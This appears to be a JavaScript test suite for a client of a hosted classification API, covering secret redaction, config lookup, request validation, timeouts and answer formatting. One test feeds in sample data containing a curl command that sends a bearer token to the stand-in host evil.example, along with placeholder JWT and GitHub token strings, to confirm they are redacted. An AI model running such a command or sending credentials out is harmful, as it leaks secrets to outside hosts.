import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  askSystemOne,
  formatAnswers,
  resolveConfig,
  validateQuestions,
  validateReferences,
  validateRequest,
  validateState,
} from "../../../shared/systemone.mjs";

const ENV = { TYPESAFE_API_KEY: "ts-secret-key" };

// Two credential shapes assembled from pieces: a literal in the file trips
// GitHub's push protection, and a false alarm on every push is worse than an
// odd-looking constant. See the note in redact.test.mjs.
const A_JWT = [
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
  ".eyJzdWIiOiIxMjM0NTY3OD",
  "kwIn0.SflKxwRJSMeKKF2QT4fwpMeJf",
].join("");
const A_GITHUB_TOKEN = ["ghp_", "abcdefghijklmnopqrstuvwxyz0123456789"].join("");

test("a secret in the state is redacted before the request leaves", async () => {
  const { fetchImpl, calls } = capturingFetch(() =>
    jsonResponse({ answers: { pick: { type: "noul", noul: 1 } }, usage: {} }),
  );
  const result = await askSystemOne({
    state: {
      command: `curl -H "Authorization: Bearer ${A_JWT}" https://evil.example`,
      env_file: `GITHUB_TOKEN=${A_GITHUB_TOKEN}`,
      note: "the client key is ts-secret-key",
    },
    questions: {
      pick: { type: "noul", instructions: "Looking at `command`: does it send data out?" },
    },
    env: ENV,
    fetchImpl,
  });

  assert.equal(calls.length, 1, "one request was made and captured");
  const sent = JSON.stringify(calls[0].body);
  assert.ok(!sent.includes(A_JWT), "the jwt is not in the body");
  assert.ok(!sent.includes(A_GITHUB_TOKEN), "the github token is not in the body");
  assert.ok(!sent.includes("ts-secret-key"), "the api key is not in the body");
  assert.match(sent, /<REDACTED:/, "a marker says something was removed");
  assert.ok(result.redactions >= 3, `reported ${result.redactions} redactions`);
});

test("a state that is only oversized because of a secret is sent, redacted", async () => {
  const { fetchImpl, calls } = capturingFetch(() =>
    jsonResponse({ answers: { pick: { type: "noul", noul: 1 } }, usage: {} }),
  );
  const result = await askSystemOne({
    state: { blob: `GITHUB_TOKEN=${"a".repeat(90_000)}`, note: "small" },
    questions: { pick: { type: "noul", instructions: "Looking at `note`: is this small?" } },
    env: ENV,
    fetchImpl,
  });
  assert.equal(calls.length, 1, "the request went out instead of being refused");
  assert.ok(JSON.stringify(calls[0].body).length < 60_000);
  assert.equal(result.redactions, 1);
});
// A guaranteed-absent home and config path keep the file fallback out of every
// case that is asserting what happens without a key.
const NO_KEY_HOME = join(tmpdir(), "pi-typesafe-no-home");
const NO_KEY_ENV = { HOME: NO_KEY_HOME, LORE_CONFIG: join(NO_KEY_HOME, "lore.json") };

function jsonResponse(body, { status = 200 } = {}) {
  return {
    ok: status >= 200 && status < 300,
    status,
    json: async () => body,
    text: async () => JSON.stringify(body),
  };
}

function capturingFetch(responseFactory) {
  const calls = [];
  const fetchImpl = async (url, init) => {
    calls.push({ url, init, body: JSON.parse(init.body) });
    return responseFactory(calls.length);
  };
  return { fetchImpl, calls };
}

test("resolveConfig reads the environment with loopback-free defaults", () => {
  const config = resolveConfig(ENV);
  assert.equal(config.apiKey, "ts-secret-key");
  assert.equal(config.baseUrl, "https://api.typesafe.ai/v1");
  assert.equal(config.model, "jev-latest");
  assert.equal(config.timeoutMs, 30000);

  const custom = resolveConfig({
    TYPESAFE_API_KEY: "k",
    TYPESAFE_BASE_URL: "https://example.test/v1/",
    TYPESAFE_MODEL: "jev-1.13",
    TYPESAFE_TIMEOUT_MS: "5000",
  });
  assert.equal(custom.baseUrl, "https://example.test/v1");
  assert.equal(custom.model, "jev-1.13");
  assert.equal(custom.timeoutMs, 5000);
});

test("resolveConfig ignores blank values and rejects non-http base urls", () => {
  const config = resolveConfig({ TYPESAFE_API_KEY: "  k  ", TYPESAFE_MODEL: "   " });
  assert.equal(config.apiKey, "k");
  assert.equal(config.model, "jev-latest");
  assert.throws(
    () => resolveConfig({ TYPESAFE_BASE_URL: "ftp://example.test", ...NO_KEY_ENV }),
    /http/i,
  );
});

test("resolveConfig accepts LORE_TYPESAFE_API_KEY as a fallback name", () => {
  assert.equal(resolveConfig({ LORE_TYPESAFE_API_KEY: "lore-named" }).apiKey, "lore-named");
  assert.equal(
    resolveConfig({ TYPESAFE_API_KEY: "primary", LORE_TYPESAFE_API_KEY: "lore-named" }).apiKey,
    "primary",
  );
  assert.equal(resolveConfig({ LORE_TYPESAFE_API_KEY: "   ", ...NO_KEY_ENV }).apiKey, "");
});

test("resolveConfig falls back to the lore config file when no env key is set", () => {
  const dir = mkdtempSync(join(tmpdir(), "pi-typesafe-"));
  try {
    const configPath = join(dir, "lore.json");
    writeFileSync(configPath, JSON.stringify({ typesafe: { apiKey: "from-lore-file" } }));

    assert.equal(resolveConfig({ LORE_CONFIG: configPath }).apiKey, "from-lore-file");
    assert.equal(
      resolveConfig({ TYPESAFE_API_KEY: "from-env", LORE_CONFIG: configPath }).apiKey,
      "from-env",
      "the environment still wins",
    );
    assert.equal(
      resolveConfig({ ...NO_KEY_ENV, HOME: dir, LORE_CONFIG: join(dir, "missing.json") }).apiKey,
      "",
    );

    writeFileSync(configPath, "{ not json");
    assert.equal(resolveConfig({ ...NO_KEY_ENV, LORE_CONFIG: configPath }).apiKey, "");
    writeFileSync(configPath, JSON.stringify({ typesafe: { apiKey: "   " } }));
    assert.equal(resolveConfig({ ...NO_KEY_ENV, LORE_CONFIG: configPath }).apiKey, "");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("resolveConfig checks the same config locations lore does", () => {
  const dir = mkdtempSync(join(tmpdir(), "pi-typesafe-paths-"));
  try {
    const home = join(dir, "home");
    const xdg = join(dir, "xdg");
    mkdirSync(join(home, ".copilot"), { recursive: true });
    mkdirSync(join(xdg, "lore"), { recursive: true });
    writeFileSync(
      join(home, ".copilot", "lore.json"),
      JSON.stringify({ typesafe: { apiKey: "legacy" } }),
    );
    writeFileSync(join(xdg, "lore", "lore.json"), JSON.stringify({ typesafe: { apiKey: "xdg" } }));

    assert.equal(resolveConfig({ HOME: home, XDG_CONFIG_HOME: xdg }).apiKey, "xdg");

    const loreHome = join(dir, "lorehome");
    mkdirSync(loreHome, { recursive: true });
    writeFileSync(
      join(loreHome, "lore.json"),
      JSON.stringify({ typesafe: { apiKey: "from-lore-home" } }),
    );
    assert.equal(
      resolveConfig({ HOME: home, XDG_CONFIG_HOME: xdg, LORE_HOME: loreHome }).apiKey,
      "from-lore-home",
      "LORE_HOME wins over XDG",
    );
    assert.equal(
      resolveConfig({ HOME: home, LORE_CONFIG: join(loreHome, "lore.json") }).apiKey,
      "from-lore-home",
      "LORE_CONFIG wins over everything",
    );
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("names the config paths it checked when no key is found", async () => {
  const missing = join(tmpdir(), "pi-typesafe-absent", "lore.json");
  await assert.rejects(
    askSystemOne({
      state: "s",
      questions: { a: { type: "noul", instructions: "?" } },
      env: { ...NO_KEY_ENV, LORE_CONFIG: missing },
      fetchImpl: async () => ({ ok: true, status: 200, json: async () => ({}) }),
    }),
    (error) => {
      assert.ok(error.message.includes(missing), "message should name the path checked");
      return true;
    },
  );
});

test("renders unusable answers instead of NaN", () => {
  const text = formatAnswers({
    model: "jev-latest",
    answers: {
      missing: { type: "noul" },
      nameless: { type: "choice", confidence: 0.5 },
      blank_score: { type: "score", score: "" },
    },
  });
  assert.doesNotMatch(text, /NaN|"undefined"/);
  assert.match(text, /missing: unusable answer/);
  assert.match(text, /nameless: unusable answer/);
  assert.match(text, /blank_score: unusable answer/);
});

test("accepts numeric answers delivered as strings", () => {
  const text = formatAnswers({
    model: "jev-latest",
    answers: {
      urgent: { type: "noul", noul: "0.92" },
      risk: { type: "score", score: "1.6", confidence: "0.8" },
    },
  });
  assert.match(text, /urgent: noul 0\.92/);
  assert.match(text, /risk: score 1\.60 \(confidence 0\.80\)/);
});

test("omits the probability line when there is no distribution", () => {
  const text = formatAnswers({
    model: "jev-latest",
    answers: { bare: { type: "choice", choice: "billing" } },
  });
  assert.match(text, /bare: choice "billing"/);
  assert.doesNotMatch(text, /probabilities:/);
});

test("an explicit LORE_CONFIG is the only file consulted", () => {
  const dir = mkdtempSync(join(tmpdir(), "pi-typesafe-explicit-"));
  try {
    const home = join(dir, "home");
    mkdirSync(join(home, ".config", "lore"), { recursive: true });
    writeFileSync(
      join(home, ".config", "lore", "lore.json"),
      JSON.stringify({ typesafe: { apiKey: "current" } }),
    );
    const broken = join(dir, "broken.json");
    writeFileSync(broken, "{ not json");

    assert.equal(resolveConfig({ HOME: home, LORE_CONFIG: broken }).apiKey, "");
    assert.equal(resolveConfig({ HOME: home }).apiKey, "current");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("is not shadowed by a stale legacy config once migrated", () => {
  const dir = mkdtempSync(join(tmpdir(), "pi-typesafe-legacy-"));
  try {
    const home = join(dir, "home");
    mkdirSync(join(home, ".copilot"), { recursive: true });
    writeFileSync(
      join(home, ".copilot", "lore.json"),
      JSON.stringify({ typesafe: { apiKey: "stale-legacy" } }),
    );
    assert.equal(
      resolveConfig({ HOME: home }).apiKey,
      "stale-legacy",
      "unmigrated installs keep working",
    );

    mkdirSync(join(home, ".config", "lore"), { recursive: true });
    writeFileSync(join(home, ".config", "lore", "lore.json"), JSON.stringify({ typesafe: {} }));
    assert.equal(
      resolveConfig({ HOME: home }).apiKey,
      "",
      "a migrated config must not fall back to the legacy key",
    );
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("validateQuestions accepts the three primitives and rejects malformed ones", () => {
  assert.doesNotThrow(() =>
    validateQuestions({
      urgent: { type: "noul", instructions: "Does this convey urgency?" },
      team: {
        type: "choice",
        instructions: "Which team?",
        criteria: { billing: "Payments", tech: null },
      },
      risk: { type: "score", instructions: "How risky?", criteria: ["Low", "Medium", "High"] },
    }),
  );
  assert.throws(() => validateQuestions({}), /at least one question/i);
  assert.throws(() => validateQuestions(null), /at least one question/i);
  assert.throws(
    () => validateQuestions({ a: { type: "vote", instructions: "?" } }),
    /unknown question type/i,
  );
  assert.throws(() => validateQuestions({ a: { type: "noul" } }), /instructions/i);
  assert.throws(
    () =>
      validateQuestions({ a: { type: "choice", instructions: "?", criteria: { only: "one" } } }),
    /at least two options/i,
  );
  assert.throws(
    () => validateQuestions({ a: { type: "score", instructions: "?", criteria: ["only"] } }),
    /at least two ordered levels/i,
  );
  assert.throws(
    () => validateQuestions({ a: { type: "score", instructions: "?", criteria: "not-an-array" } }),
    /at least two ordered levels/i,
  );
});

test("validateState refuses a state past the API limit before the round trip", () => {
  validateState({ small: "x".repeat(1000) });
  validateState(undefined);
  const huge = { text: "x".repeat(60_001) };
  assert.throws(() => validateState(huge), /state is \d+ characters; the limit is 60000/);
  // The limit is the API's, and a request past it fails whole: measured, so a
  // change to the number here has to face the real one.
  assert.equal(JSON.stringify(huge).length > 60_000, true);
});

test("validateReferences refuses a question that names a path the state lacks", () => {
  const state = { goal: "ship it", segment: { role: "user", path: null }, next: "(none)" };
  const question = (instructions) => ({
    load_bearing: { type: "noul", instructions, criteria: { true: "y", false: "n" } },
  });
  validateReferences(state, question("Does `segment` carry load-bearing detail?"));
  validateReferences(state, question("Is `next` the start of a new task?"));
  assert.throws(
    () => validateReferences(state, question("Is `segment.path.length` set?")),
    /Question "load_bearing" refers to `segment.path.length`, and the state has no `segment.path.length`. The state has: goal, segment, next./,
  );
  // References to things that are not state are none of this check's business:
  // a disposition name, a path with a line range, a shell command, prose. The
  // boundary is the first part of the reference — a state key renamed without
  // its question (`segments.s0` after `segment`) is not caught here, because
  // flagging every unknown head would flag ordinary prose.
  validateReferences(
    state,
    question("Prefer `keep_verbatim` over `path:12-40` after `git add -A`."),
  );
  validateReferences(state, question("Is `segments.s0` in the state?"));
});

test("validateRequest refuses a state that JSON would not carry intact", async () => {
  const questions = {
    ok: {
      type: "noul",
      instructions: "Does `text` read as done?",
      criteria: { true: "y", false: "n" },
    },
  };
  validateRequest({ state: { text: "done", nested: { list: [1, 2, null] } }, questions });

  assert.throws(
    () => validateRequest({ state: { text: undefined }, questions }),
    /state\.text is undefined, which JSON drops/,
  );
  assert.throws(
    () => validateRequest({ state: { text: () => {} }, questions }),
    /state\.text is a function, which JSON drops/,
  );
  assert.throws(
    () => validateRequest({ state: { text: new Map([["a", 1]]) }, questions }),
    /state\.text is a Map, which JSON serializes as \{\}/,
  );
  assert.throws(
    () => validateRequest({ state: { text: Number.NaN }, questions }),
    /state\.text is NaN, which JSON turns into null/,
  );
  const circular = { text: "done" };
  circular.self = circular;
  assert.throws(() => validateRequest({ state: circular, questions }), /circular/);
  // A question that names a path the state lacks is refused too, and the caller
  // learns it before a request is paid for.
  await assert.rejects(
    askSystemOne({
      state: { text: { body: "done" } },
      questions: {
        ok: {
          type: "noul",
          instructions: "Is `text.missing` set?",
          criteria: { true: "y", false: "n" },
        },
      },
      env: ENV,
      fetchImpl: async () => {
        throw new Error("no request should be made");
      },
    }),
    /refers to `text.missing`, and the state has no `text.missing`/,
  );
});

test("askSystemOne refuses an oversized state without calling the provider", async () => {
  let called = false;
  await assert.rejects(
    askSystemOne({
      state: { text: "x".repeat(60_001) },
      questions: { a: { type: "noul", instructions: "?", criteria: { true: "y", false: "n" } } },
      env: { TYPESAFE_API_KEY: "test-key" },
      fetchImpl: async () => {
        called = true;
        return { ok: true, json: async () => ({ answers: {} }) };
      },
    }),
    /state is \d+ characters/,
  );
  assert.equal(called, false);
});

test("askSystemOne posts state and questions verbatim and returns answers", async () => {
  const { fetchImpl, calls } = capturingFetch(() =>
    jsonResponse({
      model: "jev-latest",
      answers: { urgent: { type: "noul", noul: 0.92 } },
      usage: { input_tokens: 12, output_tokens: 2 },
    }),
  );
  const questions = { urgent: { type: "noul", instructions: "Does this convey urgency?" } };
  const state = { ticket: { messages: ["Payouts failing for 3 days"] } };

  const result = await askSystemOne({ state, questions, env: ENV, fetchImpl });

  assert.equal(calls.length, 1);
  assert.equal(calls[0].url, "https://api.typesafe.ai/v1/systemone");
  assert.equal(calls[0].init.method, "POST");
  assert.equal(calls[0].init.headers.authorization, "Bearer ts-secret-key");
  assert.equal(calls[0].init.headers["content-type"], "application/json");
  assert.equal(calls[0].init.headers["TypeSafe-Danger-Zone-Images"], "true");
  assert.equal(calls[0].init.redirect, "error");
  assert.deepEqual(calls[0].body, { model: "jev-latest", state, questions });
  assert.deepEqual(result, {
    model: "jev-latest",
    answers: { urgent: { type: "noul", noul: 0.92 } },
    usage: { input_tokens: 12, output_tokens: 2 },
    redactions: 0,
  });
});

test("a redaction is reported where the answers are, and silence means none", () => {
  const answers = { urgent: { type: "noul", noul: 0.92 } };
  const usage = { input_tokens: 12, output_tokens: 2 };
  assert.match(formatAnswers({ model: "jev-latest", usage, answers, redactions: 3 }), /3 redacted/);
  assert.doesNotMatch(
    formatAnswers({ model: "jev-latest", usage, answers, redactions: 0 }),
    /redact/,
  );
  assert.doesNotMatch(formatAnswers({ model: "jev-latest", usage, answers }), /redact/);
});

test("askSystemOne honors a per-call model override", async () => {
  const { fetchImpl, calls } = capturingFetch(() => jsonResponse({ answers: {}, usage: {} }));
  await askSystemOne({
    state: "s",
    questions: { a: { type: "noul", instructions: "?" } },
    model: "jev-1.13",
    env: ENV,
    fetchImpl,
  });
  assert.equal(calls[0].body.model, "jev-1.13");
});

test("askSystemOne fails fast on a missing key without calling the provider", async () => {
  const { fetchImpl, calls } = capturingFetch(() => jsonResponse({}));
  await assert.rejects(
    askSystemOne({
      state: "s",
      questions: { a: { type: "noul", instructions: "?" } },
      env: NO_KEY_ENV,
      fetchImpl,
    }),
    (error) => {
      assert.match(error.message, /TYPESAFE_API_KEY/);
      return true;
    },
  );
  assert.equal(calls.length, 0);
});

test("askSystemOne rejects malformed questions before any request", async () => {
  const { fetchImpl, calls } = capturingFetch(() => jsonResponse({}));
  await assert.rejects(
    askSystemOne({
      state: "s",
      questions: { a: { type: "choice", instructions: "?", criteria: { one: "only" } } },
      env: ENV,
      fetchImpl,
    }),
    /at least two options/i,
  );
  assert.equal(calls.length, 0);
});

test("askSystemOne surfaces HTTP failures with status detail and no key", async () => {
  const fetchImpl = async () => ({
    ok: false,
    status: 422,
    text: async () => '{"detail":"unknown question type"}',
  });
  await assert.rejects(
    askSystemOne({
      state: "s",
      questions: { a: { type: "noul", instructions: "?" } },
      env: ENV,
      fetchImpl,
    }),
    (error) => {
      assert.match(error.message, /422/);
      assert.match(error.message, /unknown question type/);
      assert.doesNotMatch(error.message, /ts-secret-key/);
      return true;
    },
  );
});

test("askSystemOne surfaces network failures", async () => {
  const fetchImpl = async () => {
    throw new Error("socket hang up");
  };
  await assert.rejects(
    askSystemOne({
      state: "s",
      questions: { a: { type: "noul", instructions: "?" } },
      env: ENV,
      fetchImpl,
    }),
    /socket hang up/,
  );
});

test("askSystemOne surfaces invalid JSON responses", async () => {
  const fetchImpl = async () => ({
    ok: true,
    status: 200,
    json: async () => {
      throw new Error("Unexpected token < in JSON");
    },
  });
  await assert.rejects(
    askSystemOne({
      state: "s",
      questions: { a: { type: "noul", instructions: "?" } },
      env: ENV,
      fetchImpl,
    }),
    /invalid JSON/i,
  );
});

test("askSystemOne times out and aborts the request", async () => {
  let aborted = false;
  const fetchImpl = async (_url, init) =>
    new Promise((_, reject) => {
      init.signal.addEventListener(
        "abort",
        () => {
          aborted = true;
          reject(new Error("aborted"));
        },
        { once: true },
      );
    });
  await assert.rejects(
    askSystemOne({
      state: "s",
      questions: { a: { type: "noul", instructions: "?" } },
      env: { ...ENV, TYPESAFE_TIMEOUT_MS: "20" },
      fetchImpl,
    }),
    /timed out/i,
  );
  assert.equal(aborted, true);
});

test("askSystemOne forwards an external abort signal", async () => {
  const controller = new AbortController();
  const fetchImpl = async (_url, init) =>
    new Promise((_, reject) => {
      init.signal.addEventListener("abort", () => reject(new Error("aborted")), { once: true });
    });
  const pending = askSystemOne({
    state: "s",
    questions: { a: { type: "noul", instructions: "?" } },
    env: ENV,
    fetchImpl,
    signal: controller.signal,
  });
  controller.abort();
  await assert.rejects(pending, /abort/i);
});

test("formatAnswers renders each primitive with its distribution", () => {
  const text = formatAnswers({
    model: "jev-latest",
    usage: { input_tokens: 100, output_tokens: 9 },
    answers: {
      urgent: { type: "noul", noul: 0.92 },
      team: {
        type: "choice",
        choice: "technical",
        confidence: 0.82,
        probabilities: { billing: 0.08, technical: 0.85, sales: 0.07 },
      },
      risk: {
        type: "score",
        score: 1.6,
        confidence: 0.78,
        legend: { 0: "Low", 1: "Medium", 2: "High" },
        probabilities: { 0: 0.05, 1: 0.3, 2: 0.65 },
      },
    },
  });
  assert.match(text, /jev-latest/);
  assert.match(text, /input_tokens=100/);
  assert.match(text, /urgent: noul 0\.92/);
  assert.match(text, /team: choice "technical" \(confidence 0\.82\)/);
  assert.match(text, /technical=0\.85/);
  assert.match(text, /risk: score 1\.60 \(confidence 0\.78\)/);
  assert.match(text, /2=High \(0\.65\)/);
});
